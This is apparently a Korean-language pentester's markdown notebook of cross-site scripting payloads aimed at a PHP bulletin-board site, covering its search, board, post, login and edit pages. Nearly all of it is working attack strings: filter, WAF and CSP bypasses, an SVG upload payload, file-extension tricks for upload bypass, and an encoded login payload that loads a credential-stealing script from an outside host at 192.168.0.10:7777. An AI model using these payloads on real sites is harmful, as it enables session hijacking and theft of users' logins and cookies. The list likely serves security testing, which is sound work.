# Payloads

## XSS

### Attack surfaces

- 게시글 검색 `search.php`의 `q` 파라미터

- 게시판 선택 시 `board.php`의 `page` 파라미터

- 글 생성 및 댓글 생성 `post.php` | `stored xss` 

### Payloads

<!-- 검색하는 곳; 숫자 및 문자열 삽입-->
`/search.php?q=<script>alert%287%29<%2Fscript>`

`/search.php?q=<script>alert%28%27test%27%29<%2Fscript>`

`/search.php?q=<img+src%3Dx+onerror%3D"%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041">`

<!-- Unicode encoding -->
`/search.php?q=<script>%5Cu0061lert%281%29<%2Fscript>`

`/search.php?q=<object+data%3D"data%3Atext%2Fhtml%2C<script>alert%281%29<%2Fscript>">`

<!-- 글 생성 및 출력되는 곳-->
<!-- 댓글 생성 및 출력되는 곳-->
`GET /post.php`

`/board.php?page=2<ScRiPt>alert(%27page%27)</sCripT>`

`/index.php?page=2xssz"><img/src=x%20onerror=confirm(999)><!--`

`/post.php?id=41"><img/src=x%20onerror=confirm(999)><!--&board=3`

`/board.php?page=2</TITLE><SCRIPT>alert("XSS");</SCRIPT>`

<!-- 로그인 페이지; username 파라미터; value 속성 내 -->
`/login.php?username=test"><img%20src=x%20onerror=alert(1)>`

`/login.php?username="><base%20href%3d"http%3a%2f%2fgoogle%2ecom%2f">`

<!-- ?username="><script%20src="http://192.168.0.10:7777/stealCredentials.js"></script><br -->
<!-- 로그인 정보 탈취; 페이로드 URL 인코딩 -->
`/login.php?username=%22%3e%3c%73%63%72%69%70%74%25%32%30%73%72%63%3d%22%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%30%2e%31%30%3a%37%37%37%37%2f%73%74%65%61%6c%43%72%65%64%65%6e%74%69%61%6c%73%2e%6a%73%22%3e%3c%2f%73%63%72%69%70%74%3e`

<!-- Custom tag 이용 -->
`/search.php?q=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x`

<!-- DOM XSS; board.php 확인 -->
`/board.php?page=2<script>alert(%27xss%27)</script>`

<!-- WAF 우회; () 사용하지 못하고, 16진수 인코딩 기법 사용 및 객체 리터럴로 onerror 이벤트에 eval 함수 적용 후 throw를 통해 트리거 -->
`/board.php?page=2<script>{onerror=eval}throw%27=alert\x281337\x29%27</script>`

<!-- CSP 우회 -->
`?token=;script-src-elem 'unsafe-inline'&search=<script>alert('XSS')</script>`

<!-- 만약 a 태그의 href 속성이 막혔을 경우 -->
`<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>`

`<svg><animateTransform onbegin=alert(1)>`

<!-- 만약 태그 내 속성이 ">를 통해서 안 닫힐경우, 속성을 이어서 적는 방식 사용 -->
`" autofocus onfocus=alert(1) x="`

`/login.php?username="%20autofocus%20onfocus=alert(1)%20x="`

<!-- <a href="$_GET['homepage']"></a> 부분이 존재할 때, 속성에 직접 pseudo-protocol 삽입 -->
`/post.php?id=51&board=3&homepage=javascript:alert(1)`

`?homepage=data:text/html,<script>alert(1)</script>`

<!-- <script>const searchTerms = '<?php echo $_GET['q'];?>'</script> 와 같은 형식으로 검색어를 받을 때-->
`/search.php?q=%27;alert(document.domain)//`

<!-- <?php $output = str_replace("'", "\\'", $output); ?> 와 같이 작은 따옴표를 이스케이프할 때 -->
`/search.php?q=\%27;alert(document.domain)//`

<!-- 글 수정하는 곳 -->
`/edit_post.php?id=51"%20autofocus%20onfocus="alert(1)<!--`

<!-- 문자열 치환 사용 -->
`/search.php?q=<img%20src="x"%20onerronerroror="alert(1)">`

<!-- const isSafeInput = x => !/<script|<img|<input|<.*on/is.test(x); 필터링 우회-->
`<iframe srcdoc="<&#x69;mg src=1 &#x6f;nerror=alert(parent.document.domain)>">`

<!-- Unicode, ASCII, Computed member access를 이용한 우회 -->
`alert(document["\u0063ook" + "ie"]);  // alert(document.cookie)`
`window['al\x65rt'](document["\u0063ook" + "ie"]);  // alert(document.cookie)`

<!-- String.fromCharCode를 이용한 우회 -->
`<script>window[String.fromCharCode(97, 108, 101, 114, 116)](1)</script>`

<!-- 36진수 변환을 통한 우회 -->
`<script>window[17795081..toString(36)](1)</script>`

<!-- 백틱(`)을 통한 우회 -->
`<script>alert`1`</script>`

<!-- alert, document, cookie 문자 필터링 우회 -->
`<script>this['al'+'ert'](this['do'+'cument']['coo'+'kie'])<script>`

<!-- location.hash를 통한 우회; 길이 검증이 존재할 때 -->
`<img src onerror="eval(location.hash.slice(1))">#alert(document.cookie);`

<!-- svg file -->
```svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert('xss');
   </script>
</svg>
```

### WAF Bypass

- 적용 가능한 태그 및 이벤트 핸들러 무차별 대입 공격으로 확인

- 모든 HTML 태그가 막혀있을 경우, Custom tag 사용

- Unicode 인코딩 기법 사용

- 프로필 이미지에 svg 업로드가 가능할 시 svg 파일 내에 페이로드 삽입

### Cheat Sheet
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet



## SQL Injection

## File upload

### 우회 확장자

`pHp` `phtml`